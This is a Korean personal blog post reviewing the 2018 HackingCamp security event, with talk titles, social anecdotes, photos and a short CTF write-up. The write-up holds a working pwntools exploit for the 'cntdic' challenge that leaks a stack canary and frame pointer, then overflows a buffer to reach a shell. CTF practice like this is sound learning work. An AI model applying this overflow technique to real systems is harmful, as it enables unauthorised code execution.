---
layout: post
title: 2018 18th HackingCamp Review
---

# **2018 18th HackingCamp Review**

![kakaotalk_20180902_175327263](https://user-images.githubusercontent.com/36659181/44996586-a24a1080-afe3-11e8-9214-50be3259e941.jpg)

거의 반강제로 해킹캠프 후기를 쓰게 된 wally0813 입니다 ㅋㅋㅋ

이래저래 사람들도 많이 뵙고 재밌었어용ㅎㅎ 개강 전 마지막 방학에 좋은 경험이였습니당ㅎㅎ

낯을 많이 가리는데 먼저 말걸어주시고 장난쳐주셔서 다들 감사합니당ㅠㅠㅋㅋ




```
어디로 가야하오 - 정진욱
나도 이제 악성코드를 분석해볼까? - 차민석
Deep dive analysis of hwp malware targeting cryptocurrency exchanges (Remaster Edition) - 조효제
Digital Forensics a2A - 김수영
BROP (부제: general ROP? nop, this is BROP!) - 안건희
apt-get install heap - 황호
Security Option Bypass 101  - 문시우
버그헌팅 어렵지 않아 – 국내 미디어플레이어 취약점 제보기 - 최광준
1 Bug 3 Bounty - 김민정
창과 방패: Cheat & Anti Cheat - 김지오
```
이번 발표 주제들이였는데 다 재밌고 다들 열심히 발표해주셧어요ㅎㅎ

개인적으로는 버그헌팅 주제들이 되게 재밌었네용 담에 꼭 도전해보고싶습니다ㅋㅋ

그리고 특히 heap 발표하신분 엄청 친절하게 설명해주셔서 감탄했습니다ㅋㅋ


중간중간 쉬는 시간에 SISS 분들이 이벤트도 해주셔서 팀원들이랑도 친해지고 재밌었어요ㅋㅋ

아이스크림 사준 팀장언니 짱bb 다른 팀원분들도 다들 친절하시고 넘 웃기셧어요ㅋㅋㅋㅋ



![kakaotalk_20180903_184259851](https://user-images.githubusercontent.com/36659181/44996665-213f4900-afe4-11e8-87ad-1366a6b716fa.jpg)

그 후엔 저녁먹고 장기자랑도 보고 치킨도 먹으면서 ctf 했습니당

ctf 는 포너블은 꼭 풀어야지 했는데, 초반에 한번도 보지 못한 윈도우 포너블이 나와서 당황하다가,..

c0nstant 님에게 왜 윈도우 포너블만 있냐고 물어보니 공부시키려고 그랬다고 합니다..ㅎㅎㅎ 공부해야지..


cntdic 나오고 그것만 봤는데 어려운 문제가 아닌데 

그날 머리가 안돌아갔는지 시간안에 못풀어서 너무 아쉬웠습니다..ㅠㅠ

flag도 못따고 아쉬운 마음에 여기에 라업 투척..

카나리있고 바운더리 걸려있는 단순한 bof 문제였습니당

```python
from pwn import *
from time import *

w = process("./cntdic")
#w = remote("kshgroup.kr",1800)

def create(name,description,language,capital):
	w.sendlineafter("Your choice : ", "1")
	w.sendlineafter(":", name)
	w.sendlineafter(":", description)
	w.sendlineafter(":", language)
	w.sendlineafter(":", capital)
	w.recvline()

def remove():
	w.sendlineafter("Your choice : ", "2")
	w.sendlineafter(":", "y")

def showlist():
    w.sendlineafter("Your choice : ", "3")

def showdetail(index):
    w.sendlineafter("Your choice : ", "4")
    w.sendlineafter(":", str(index))
	w.recvuntil("Capital :")
	canary = u32(w.recvuntil("Language :")[55:58].rjust(4,"\x00"))
	ebp = u32(w.recvuntil("=")[26:30])+0x40
	return canary, ebp

for i in range(0, 95):
	create("a"*20, "b"*30,"c"*20,"d"*20)

create("a"*20, "b"*30,"c"*20,"d"*53)

canary, ebp = showdetail(99)
log.info("Find Canary!! "+hex(canary))
log.info("Find EBP!! "+hex(ebp))

one_shot = 0x08048e86 + 0x1d

remove()

create("a"*20, "b"*30,"c"*20,"d"*53+p32(canary)+p32(one_shot)+p32(ebp-4))

w.interactive()

```


그리고 대망의..
![kakaotalk_20180902_182005462](https://user-images.githubusercontent.com/36659181/44996681-4c299d00-afe4-11e8-8c48-856b0f64b7e0.jpg)
강준혁의 계략으로 찍게 된 헥서 단체사진ㅠㅠ

아직도 그때만 생각하면 쪽팔린데ㅋㅋㅋ 좋은 추억이였네요ㅠㅠㅋㅋㅋㅋ

그리고 팀장님이 좋아하셔서 다행입니다ㅋㅋㅋㅋㅋㅋ


상받으신 분들 다들 축하드리고 해킹캠프 운영해주신 POC 분들, SISS, DEMON 팀 분들 다들 고생하셧습니다 XD


저는 이만 윈도우 포너블 공부하러...빠이!

